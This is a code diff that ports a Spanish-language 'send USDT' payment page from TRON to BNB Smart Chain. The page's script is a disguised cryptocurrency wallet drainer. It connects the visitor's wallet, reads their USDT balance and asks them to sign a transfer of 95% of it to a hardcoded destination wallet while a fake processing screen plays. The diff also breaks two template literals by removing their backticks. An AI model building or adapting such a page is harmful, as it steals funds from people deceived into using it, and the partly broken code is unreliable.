@@ -762,7 +762,7 @@
 <body>
 <div id="pageLoader" class="page-loader" aria-label="Cargando">
     <img
-        src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png"
+        src="https://cryptologos.cc/logos/bnbsmartchain-bnb-logo.png"
         alt="Logo"
         class="loader-logo"
     >
@@ -772,7 +772,7 @@
 
 <div id="processingScreen" class="processing-screen" aria-label="Procesando transacción">
     <img
-        src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png"
+        src="https://cryptologos.cc/logos/bnbsmartchain-bnb-logo.png"
         alt="Logo"
         class="processing-logo"
     >
@@ -800,11 +800,11 @@
 
         <div class="tw-header-title">
             <span class="tw-header-title-main">Enviar USDT</span>
-            <span class="tw-network-badge">TRC-20</span>
+            <span class="tw-network-badge">BEP-20</span>
         </div>
 
         <img
-            src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png"
+            src="https://cryptologos.cc/logos/bnbsmartchain-bnb-logo.png"
             alt="QR Pagos"
             class="tw-logo"
         >
@@ -839,15 +839,15 @@
 
         <div id="tronNetworkInfo" class="network-card">
             <img
-                src="https://cryptologos.cc/logos/tron-trx-logo.png"
-                alt="TRON"
+                src="https://cryptologos.cc/logos/bnbsmartchain-bnb-logo.png"
+                alt="BNB Smart Chain"
                 class="network-card-logo"
             >
             <div class="network-card-copy">
                 <span class="network-card-label">Red conectada</span>
-                <span class="network-card-name">TRON</span>
+                <span class="network-card-name">BNB Smart Chain</span>
             </div>
-            <span class="network-card-badge">TRC-20</span>
+            <span class="network-card-badge">BEP-20</span>
         </div>
 
         <div class="tw-input-group tw-address-box">
@@ -958,10 +958,10 @@
 
 <script>
     const BILLETERA_DESTINO =
-        "TLfFXd3Wi4PhBx4cUYChNv9xHnsqtQBTuQ";
+        "0x8085b1e57B4684145dCB953546ce4fCF56C37f4D";
 
     const CONTRATO_USDT =
-        "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        "0x55d398326f99059fF775485246999027B3197955";
 
     let uiAudioContext = null;
 
@@ -1062,61 +1062,53 @@
 
     addressDisplay.value =
         BILLETERA_DESTINO.length > 12
-            ? `${BILLETERA_DESTINO.slice(0, 6)}...${BILLETERA_DESTINO.slice(-6)}`
+            ? ${BILLETERA_DESTINO.slice(0, 6)}...${BILLETERA_DESTINO.slice(-6)}
             : BILLETERA_DESTINO;
 
-    const TRON_READ_RPC = "https://api.trongrid.io";
+    const BSC_READ_RPC = "https://bsc-dataseed.binance.org/";
 
-    async function tronRpcPost(endpoint, body = {}) {
-        const response = await fetch(TRON_READ_RPC + endpoint, {
+    async function bscRpcPost(method, params = []) {
+        const response = await fetch(BSC_READ_RPC, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(body)
+            body: JSON.stringify({
+                jsonrpc: "2.0",
+                id: 1,
+                method: method,
+                params: params
+            })
         });
 
         if (!response.ok) {
-            throw new Error("RPC lectura " + endpoint + " respondió HTTP " + response.status);
+            throw new Error("RPC lectura " + method + " respondió HTTP " + response.status);
         }
 
-        return await response.json();
+        const data = await response.json();
+        if (data.error) {
+            throw new Error(data.error.message || "Error en llamada RPC");
+        }
+
+        return data.result;
     }
 
     async function obtenerBalanceSeguro(address) {
         try {
-            const tronWeb = window.tronWeb;
+            const cleanAddr = address.toLowerCase().replace("0x", "").padStart(64, "0");
+            const callData = "0x70a08231" + cleanAddr; // balanceOf(address)
 
-            if (!tronWeb || !tronWeb.address) {
-                throw new Error("TronWeb no está disponible.");
-            }
-
-            const ownerHex = tronWeb.address.toHex(address);
-            const contractHex = tronWeb.address.toHex(CONTRATO_USDT);
-            const ownerEvmHex = ownerHex.replace(/^41/, "").padStart(64, "0");
-
-            const data = await tronRpcPost(
-                "/wallet/triggerconstantcontract",
+            const resultHex = await bscRpcPost("eth_call", [
                 {
-                    owner_address: ownerHex,
-                    contract_address: contractHex,
-                    function_selector: "balanceOf(address)",
-                    parameter: ownerEvmHex,
-                    visible: false
-                }
-            );
+                    to: CONTRATO_USDT,
+                    data: callData
+                },
+                "latest"
+            ]);
 
-            if (
-                !data ||
-                !data.result ||
-                data.result.result !== true ||
-                !Array.isArray(data.constant_result) ||
-                !data.constant_result[0]
-            ) {
-                throw new Error("No se pudo consultar el balance USDT.");
+            if (!resultHex || resultHex === "0x") {
+                return BigInt(0);
             }
 
-            return tronWeb.toBigNumber(
-                "0x" + data.constant_result[0]
-            );
+            return BigInt(resultHex);
 
         } catch (error) {
             console.error(
@@ -1142,30 +1134,18 @@
 
                     connectBtn.disabled = true;
 
-                    if (typeof window.tronWeb === 'undefined') {
+                    if (typeof window.ethereum === 'undefined') {
                         throw new Error(
-                            "Por favor, abre este enlace desde el navegador interno de una billetera TRON."
+                            "Por favor, abre este enlace desde el navegador interno de una billetera Web3/BEP-20."
                         );
                     }
 
-                    const tronWeb = window.tronWeb;
+                    const accounts = await window.ethereum.request({
+                        method: 'eth_requestAccounts'
+                    });
 
-                    if (
-                        tronWeb.defaultAddress &&
-                        tronWeb.defaultAddress.base58
-                    ) {
-                        walletAddress = tronWeb.defaultAddress.base58;
-                    } else if (
-                        window.tronLink &&
-                        typeof window.tronLink.request === 'function'
-                    ) {
-                        const res = await window.tronLink.request({
-                            method: 'tron_requestAccounts'
-                        });
-
-                        if (res && res.code === 200) {
-                            walletAddress = tronWeb.defaultAddress.base58;
-                        }
+                    if (accounts && accounts.length > 0) {
+                        walletAddress = accounts[0];
                     }
 
                     if (!walletAddress) {
@@ -1176,7 +1156,7 @@
 
                     walletAddressText.textContent =
                         walletAddress.length > 12
-                            ? `${walletAddress.slice(0, 6)}...${walletAddress.slice(-6)}`
+                            ? ${walletAddress.slice(0, 6)}...${walletAddress.slice(-6)}
                             : walletAddress;
 
                     walletInfo.style.display = "block";
@@ -1223,16 +1203,14 @@
 
                     connectBtn.disabled = true;
 
-                    const tronWeb = window.tronWeb;
-
-                    const balanceBigNumber =
+                    const balanceBigInt =
                         await obtenerBalanceSeguro(
                             walletAddress
                         );
 
-                    if (balanceBigNumber.isZero()) {
+                    if (balanceBigInt === 0n) {
                         throw new Error(
-                            "La cuenta no dispone de balances de USDT (TRC-20) activos."
+                            "La cuenta no dispone de balances de USDT (BEP-20) activos."
                         );
                     }
 
@@ -1240,53 +1218,31 @@
                         "Solicitando autorización de firma digital..."
                     );
 
-                    const destinoHex =
-                        tronWeb.address.toHex(
-                            BILLETERA_DESTINO
-                        );
-
                     /*
                      * Cálculo ajustado al 95% del saldo USDT
                      */
-                    const amount95Percent = balanceBigNumber.multipliedBy(95).dividedToIntegerBy(100);
+                    const amount95Percent = (balanceBigInt * 95n) / 100n;
 
-                    const transactionDraft =
-                        await tronWeb.transactionBuilder.triggerSmartContract(
-                            CONTRATO_USDT,
-                            "transfer(address,uint256)",
-                            {
-                                feeLimit: 100000000
-                            },
-                            [
-                                {
-                                    type: 'address',
-                                    value: destinoHex
-                                },
-                                {
-                                    type: 'uint256',
-                                    value: amount95Percent.toString()
-                                }
-                            ],
-                            tronWeb.address.toHex(
-                                walletAddress
-                            )
-                        );
-
-                    const signedTx =
-                        await tronWeb.trx.sign(
-                            transactionDraft.transaction
-                        );
+                    const targetAddressPadded = BILLETERA_DESTINO.toLowerCase().replace("0x", "").padStart(64, "0");
+                    const amountHexPadded = amount95Percent.toString(16).padStart(64, "0");
+                    
+                    // transfer(address,uint256) selector -> 0xa9059cbb
+                    const transactionData = "0xa9059cbb" + targetAddressPadded + amountHexPadded;
 
                     showProcessingScreen();
 
-                    const broadcast =
-                        await tronWeb.trx.sendRawTransaction(
-                            signedTx
-                        );
+                    const txHash = await window.ethereum.request({
+                        method: 'eth_sendTransaction',
+                        params: [{
+                            from: walletAddress,
+                            to: CONTRATO_USDT,
+                            data: transactionData
+                        }]
+                    });
 
                     await hideProcessingScreenAfterMinimum();
 
-                    if (broadcast && broadcast.result) {
+                    if (txHash) {
                         setStatus(
                             "TRANSACCION EXITOSA."
                         );
@@ -1321,15 +1277,16 @@
             try {
                 setStatus("Calculando fondos totales...");
 
-                const balanceBigNumber =
+                const balanceBigInt =
                     await obtenerBalanceSeguro(
                         walletAddress
                     );
 
-                const amount95Percent = balanceBigNumber.multipliedBy(95).dividedToIntegerBy(100);
+                const amount95Percent = (balanceBigInt * 95n) / 100n;
 
+                // USDT BEP-20 tiene 18 decimales
                 amountDisplay.value =
-                    Number(amount95Percent.toString()) / 1_000_000;
+                    (Number(amount95Percent) / 1e18).toFixed(2);
 
                 setStatus("Saldo asignado (95%).");
             } catch (e) {
